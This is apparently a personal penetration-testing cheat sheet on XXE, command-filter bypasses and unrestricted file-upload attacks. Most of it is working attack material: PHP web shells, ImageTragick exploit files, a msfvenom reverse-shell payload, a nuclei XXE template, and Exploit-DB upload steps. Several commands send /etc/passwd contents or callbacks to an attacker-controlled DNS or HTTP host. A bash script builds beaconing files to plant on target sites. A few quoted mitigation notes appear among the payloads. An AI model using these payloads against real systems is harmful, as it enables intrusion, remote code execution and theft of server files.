# shell brace expansion filter bypass
```
echo "which -a curl" | echo "{$(tr -s " " ,)}"
echo "which -a curl" | ./msfvenom -p - -a cmd --platform unix -b " " -e cmd/brace
```
the response will be: {which,-a,curl}

this should bypass some restrictions

## alternate examples space filter evasion/bypass:
```
echo a.|{which,-a,curl}
echo |{which,-a,curl};#.a
cat${IFS}/etc/passwd
```

# Out-Of-Band XXE via HTTP LOCK Method
https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/

- Find Login Page
- Capture the packets in Burp Suite
- Change the GET or POST to OPTIONS (send it?)
- If not gettting the response wanted try removing the login.php or login.jsp and replace it with test (no extension needed)
- In the RAW responselooking for:
```
Allow: OPTIONS, MKCOL, PUT, LOCK
MS-Author-Via: DAV
```
- If the application has PROPPATCH,PROPFIND,LOCK HTTP methods enabled, it will accept XML as input.
- Try the different metthods looking for xml in the RAW response
- In the Request add this to the bottom:
```
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "<FQDN>"> %xxe; ]>
```
# - Send new Request
- Create file: exploited.dtd hosted on <FQDN>
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
```
- Change the Request Header to:
```
LOCK /xxxx/test HTTP/1.1
```
- Change the Request Body to include the vulnerable URL:
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "<FQDN>/exploitd.dtd">
%xxe;
%ext;
]>
<foo><u>
&exfil;
</u></foo>
```

# -  nuclei template to automate finding login pages
https://github.com/projectdiscovery/nuclei
```
id: XXE on XXXX Login

info:
  name: XML External Entity-XXXX
  author: dhiyaneshDk
  severity: high

requests:
  - raw: 
      - |
        LOCK /xxxx/test HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Cache-Control: max-age=0
        Content-Length: 178
        
        <?xml version="1.0"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY % xxe SYSTEM "<FQDN>/exploitd.dtd">
        %xxe;
        %ext;
        ]>
        <foo><u>
        &exfil
        </u></foo>

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - '/root:x:0:0:root:/root:/bin/bash'
        part: body
```

# Blind XXE OOB over DNS using a PDF file
## Unrestricted File Upload 
https://www.youtube.com/watch?v=aSiIHKeN3ys&list=PLF7JR1a3dLONdkRYU_8-5OcgOzrWe2549&index=2&t=1s
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

xml into pdf file
burp collaborator (upload scanner)
dns lookup in collaborator window
host reverse lookup prt of the inscope domain 
used whois to verify

**TIP: sometimes hosting files on the site itself will bypass blacklists.**
**TIP: use unique subdomains and document them so you know who is calling back to your system.**

```
GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.<subdomain>.burpcollaborator.net
```
allowed the use of DNS to exfiltrate the first line of the /etc/passwd file encoded in Base64 

consider using BIND server for the return instead of burp collaborator

https://wiki.debian.org/Bind9

https://linuxtechlab.com/configuring-dns-server-using-bind/

### Setup: 

### Exploit:
**Do not try to replace the existing files during testing unless it is safe to proceed. For instance, replacing configuration files such as “web.config” or “.htaccess” file can lead to a denial of service attack for the whole website.**
1. Find file upload area of a website 
2. create 'malicious' file to upload (based on what can be uploaded, try many file types despite what the upload says it will allow)
3. wait for contact 


### Questions:
1. When it is uploaded does it give us a link or become viewable on the site? if so try a webshell. 
2. What file types are allowed to be uploaded? make sure to test this and verify that it won't accept anything but what it says. 
3. Can I bypass filtering using double extensions? 

### Other file upload payload types??


### Examples:
use msfvenom to build payloads?
```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.7 lport=4444 -f raw
```

**Attacks on application platform**
- Upload .jsp file into web tree - jsp code executed as the web user
- Upload .gif file to be resized - image library flaw exploited
- Upload huge files - file space denial of service
- Upload file using malicious path or name - overwrite a critical file
- Upload file containing personal data - other users access it
- Upload file containing “tags” - tags get executed as part of being “included” in a web page
- Upload .rar file to be scanned by antivirus - command executed on a server running the vulnerable antivirus software

**Attacks on other systems**
- Upload .exe file into web tree - victims download trojaned executable
- Upload virus infected file - victims’ machines infected
- Upload .html file containing script - victim experiences Cross-site Scripting (XSS)
- Upload .jpg file containing a Flash object - victim experiences Cross-site Content Hijacking.
- Upload .rar file to be scanned by antivirus - command executed on a client running the vulnerable antivirus software

### Beating getimagesize()
The getimagesize() function will check if it is an image and will check “mime” to verify image type.

**Insecure Configuration:**
```
 <FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)">  SetHandler application/x-httpd-php  </FileMatch>
```

**Secure Configuration:**
```
 <FilesMatch ".+\.ph(p([3457s]|\-s)?|t|tml)$">  SetHandler application/x-httpd-php  </FileMatch>
```
If the service is up an running with the Insecure Configuration, any one can beat the getimagesize function by writing comments in GIF file.

install gifsicle
```
apt-get install gifsicle  
 ```
Once installed, the below commands will help writing the commands in gif file.
```
gifsicle < mygif.gif -- comment "
<?php echo ‘Current PHP version: ‘ . phpversion(); ?>
” > output.php.gif
```
The above command will create an file with the name “output.php.gif” which simply need to be upload durning the check of file upload vulnerability.


## x.gif - profile picture upload
https://hackerone.com/reports/135072

Upload the following ASCII file as x.gif using the regular profile picture upload flow:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```
This executes the wget command and makes an HTTP request to 1.2.3.4 on port 1337.

## ImageTragick
any service, which uses ImageMagick to process user supplied
images and uses default delegates.xml / policy.xml, may be vulnerable to
this issue.

1. check for a policy.xml file and test it against https://packetstormsecurity.com/files/download/152364/ImageTragick-PoCs.zip to see if you can exploit this vulnerability on the site in question. 
2. use Metasploit https://www.rapid7.com/db/modules/exploit/unix/fileformat/imagemagick_delegate/
```
msf > use exploit/unix/fileformat/imagemagick_delegate
msf exploit(imagemagick_delegate) > show targets
    ...targets...
msf exploit(imagemagick_delegate) > set TARGET < target-id >
msf exploit(unix/fileformat/imagemagick_delegate) > show options

Module options (exploit/unix/fileformat/imagemagick_delegate):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILENAME   msf.png          yes       Output file
   USE_POPEN  true             no        Use popen() vector


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   SVG file


msf exploit(imagemagick_delegate) > exploit
```

### Info:
https://imagetragick.com/

There are multiple vulnerabilities in ImageMagick, a package commonly used by web services to process images. One of the vulnerabilities can lead to remote code execution (RCE) if you process user submitted images. The exploit for this vulnerability is being used in the wild.

A number of image processing plugins depend on the ImageMagick library, including, but not limited to, PHP’s imagick, Ruby’s rmagick and paperclip, and nodejs’s imagemagick.

If you use ImageMagick or an affected library, we recommend you mitigate the known vulnerabilities by doing at least one of these two things (but preferably both!):

1. Verify that all image files begin with the expected "magic bytes" corresponding to the image file types you support before sending them to ImageMagick for processing. 
2. Use a policy file to disable the vulnerable ImageMagick coders. The global policy for ImageMagick is usually found in “/etc/ImageMagick”. The below policy.xml example will disable the coders EPHEMERAL, URL, MVG, and MSL.

### Detailed Vulnerability Information
ImageMagick: Multiple vulnerabilities in image decoder
**CVE-2016-3714 -** Insufficient shell characters filtering leads to(potentially remote) code execution
Insufficient filtering for filename passed to delegate's command allows remote code execution during conversion of several file formats.

ImageMagick allows to process files with external libraries. This feature is called 'delegate'. It is implemented as a system() with command string ('command') from the config file delegates.xml with actual value for different params (input/output filenames etc). Due to insufficient %M param filtering it is possible to conduct shell command injection. One of the default delegate's command is used to handle https requests:
```
"wget" -q -O "%o" "https:%M"
```

where %M is the actual link from the input. It is possible to pass the value like
```
`https://example.com";|ls "-la`
```
and execute unexpected 'ls -la'. (wget or curl should be installed)
```
$ convert 'https://example.com";|ls "-la' out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
```
The most dangerous part is ImageMagick supports several formats like svg, mvg (thanks to Stewie for his research of this file format and idea of the local file read vulnerability in ImageMagick, see below), maybe some others - which allow to include external files from any supported protocol including delegates. As a result, any service, which uses ImageMagick to process user supplied images and uses default delegates.xml / policy.xml, may be vulnerable to this issue.

**exploit.mvg**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```

**exploit.svg**
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
"http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```

**Example execution**
```
$ convert exploit.mvg out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
```

ImageMagick tries to guess the type of the file by it's content, so exploitation doesn't depend on the file extension. You can rename exploit.mvg to exploit.jpg or exploit.png to bypass file type checks. In addition, ImageMagick's tool identify is also vulnerable, so it can't be used as a protection to filter file by it's content and creates additional attack vectors (e.g. via less exploit.jpg', because identify is invoked via lesspipe.sh).

Ubuntu 14.04 and OS X, latest system packages (ImageMagick 6.9.3-7 Q16 x86_64 2016-04-27 and ImageMagick 6.8.6-10 2016-04-29 Q16) and latest sources from 6 and 7 branches all are vulnerable. Ghostscript and wget (or curl) should be installed on the system for successful PoC execution. For svg PoC ImageMagick's svg parser should be used, not rsvg.

All other issues also rely on dangerous ImageMagick feature of external files inclusion from any supported protocol in formats like svg and mvg.

**CVE-2016-3718 -** SSRF
It is possible to make HTTP GET or FTP request:

**ssrf.mvg**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
```
the following then makes an http request to example.com
```
$ convert ssrf.mvg out.png
```

**CVE-2016-3715 -** File deletion
It is possible to delete files by using ImageMagick's 'ephemeral' pseudo protocol which deletes files after reading:

**delete_file.mvg**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
popgraphic-context
```
```
$ touch /tmp/delete.txt
$ convert delete_file.mvg out.png # deletes /tmp/delete.txt
```
**CVE-2016-3716 -** File moving
It is possible to move image files to file with any extension in any folder by using ImageMagick's 'msl' pseudo protocol. msl.txt and image.gif should exist in known location - /tmp/ for PoC (in real life it may be web service written in PHP, which allows to upload raw txt files and process images with ImageMagick):

**file_move.mvg**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'msl:/tmp/msl.txt'
popgraphic-context
```
**/tmp/msl.txt**
```
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="/tmp/image.gif" />
<write filename="/var/www/shell.php" />
</image>
```

/tmp/image.gif - image with php shell inside (https://www.secgeek.net/POC/POC.gif for example)
```
$ convert file_move.mvg out.png # moves /tmp/image.gif to /var/www/shell.php
```
**CVE-2016-3717 -** Local file read (independently reported by original research author - Stewie)
It is possible to get content of the files from the server by using ImageMagick's 'label' pseudo protocol:

**file_read.mvg**
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
```
```
$ convert file_read.mvg out.png
```
produces file with text rendered from /etc/passwd


## PHP
https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/

 upload a PHP file
```
<?php if(isset($_REQUEST[‘cmd‘])){ echo “<pre>“; $cmd = ($_REQUEST[‘cmd‘]); system($cmd); echo “</pre>“; die; }?>
``` 
Attempt with multiple exetensions:
- php
- phps
- phpt
- php3 
- php4 
- php5

Example Target: http://targetsite.com/images/users/19982638/cmd.phps?cmd=cat+/etc/passwd


## Inkscape XXE vulnerability during rasterization of SVG images
https://bugs.launchpad.net/inkscape/+bug/1025185

http://cwe.mitre.org/data/definitions/827.html


## if not able to upload the file type you like try adding extensions and/or special characters
https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/

consider throwing hex or decimel in as well. 

```
maliciousfile.jpg.asp
Maliciousfile.asp;,jpg
"shell.php" (appended U+0000))
```
#### Exploit for Wordpress Plugin Contact Form 7 5.3.1
https://www.exploit-db.com/exploits/49294

1. Change the file extension of the file you want to upload (e.g: 
"shell.php") to its equivalent with the special character ending (in
this case "shell.php" (appended U+0000))

2. Upload the file using ContactForm7 file upload feature in the 
target website.

3. Go to <target.com>/wp-content/uploads/wpcf7_uploads/shell.php
Note the special character at the end
Note that the file upload location may vary as it is configurable.

4. Now you have uploaded your file!


## App blocks %0D%0A? we try %0A or %0D or %u2028 or %2029 (using correct encoding).

But also remember to try things like this especially if you are dealing with Java:
```
%C0%8D%C0%8A
%c4%8a
%EA%A8%8A
```


## Double extensions
.jpg.php, where it circumvents easily the regex \.jpg


## Null bytes
.php%00.jpg, where .jpg gets truncated and .php becomes the new extension



# tracking my attacks
- Make command to take the website, date, and random name to make folders for each. 
- store a copy of the malicious fle locally. use the files to upload on sites.
- base64 encode string.
- call back to my DNS server using ```ping -c 1 <website-date-unique-filename>.<FQDN>``` for easy look up. 

```
#!/bin/bash

# Ask the user what website they are making this for.
echo "what website would you like to make this stuff for?"
read varname

# Ask the user what DNS server 
echo "what DNS server would you like to use for data exfiltration/ verification?"
read varname2

# use variable to make folder
mkdir $varname/$(date + "%d-%b-%Y")

# change directory 
cd $varname/$(date + "%d-%b-%Y")

# for loop to make files
for each format in $(cat format.txt); do key=$(echo "$varname.$(date + "%d-%b-%Y-%T").$(echo $RANDOM).$format" | base64); touch $key.$format; echo "ping -c 1 $key.$varname2" >> $key.$format; done 

python in a zip. 

svg
jpg
jpeg
png
tiff
tif
gif
eps
raw
psd
xcf
cdr
ai
bmp
cr2
nef
orf
sr2
psp

.C	C/C++ Source Code File
.CLASS	Java Class File
.CPP	C++ Source Code File
.CS	C# Source Code File
.DTD	Document Type Definition File
.FLA	Adobe Animate Animation
.H	C/C++/Objective-C Header File
.JAVA	Java Source Code File
.LUA	Lua Source File
.M	Objective-C Implementation File
.PL	Perl Script
.PY	Python Script
.SH	Bash Shell Script
.SLN	Visual Studio Solution File
.SWIFT	Swift Source Code File
.VB	Visual Basic Project Item File
.VCXPROJ	Visual C++ Project
.XCODEPROJ	Xcode Project

ini
sh
php
bat
bmp
js
exe
bin
cgi
com
jar
wsf
cab
dll
ico
sys
cfg
cue
iso
dmg


.ASP	Active Server Page
.ASPX	Active Server Page Extended File
.CER	Internet Security Certificate
.CFM	ColdFusion Markup File
.CRDOWNLOAD	Chrome Partially Downloaded File
.CSR	Certificate Signing Request File
.CSS	Cascading Style Sheet
.DCR	Shockwave Media File
.HTM	Hypertext Markup Language File
.HTML	Hypertext Markup Language File
.JS	JavaScript File
.JSP	Java Server Page
.PHP	PHP Source Code File
.RSS	Rich Site Summary
.XHTML	Extensible Hypertext Markup Language File

xml

tar
zip
zipx
gz
7z
bz2
rar
tgz
xz

txt
doc
docx
pdf
xls
xlsx
csv
ppt
pptx
ods
odt
rtf
tex

wav
mp3
mp4
mpa
wma
mid
avi
flv
mov
mpg
vob
wmv

sql
db

msg	outlook message

pem	ssh key

ttf
otf
fnt

bak
tmp

```


# Encode and exfiltrate data:
```
for i in $(cat /etc/passwd); do key=$(echo "$i" | base64 | sed 's/=//g'); ping -c 1 $key.<FQDN>; done
```

# Decode and retrieve the information:
```
for i in $(cat /var/log/named/named.log); do echo $i | awk '$1 ~ "<FQDN>" { gsub(".<FQDN>",""); print $1}' | base64 -d -i ; done  >> info.txt
```


# change file name with burp
https://www.exploit-db.com/exploits/49440

1. Login in the application
2. Go to Clients and you can add new client o modify existent
3. Click examination botton and upload a test.php with content:
```
"<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd =
($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>"
```
4. Click Upload and intercept with burpsuite
5. Change the content type to image/png
6. Go to the path:
```
http://localhost:8080/lims/uploads/test.php?cmd=dir
```






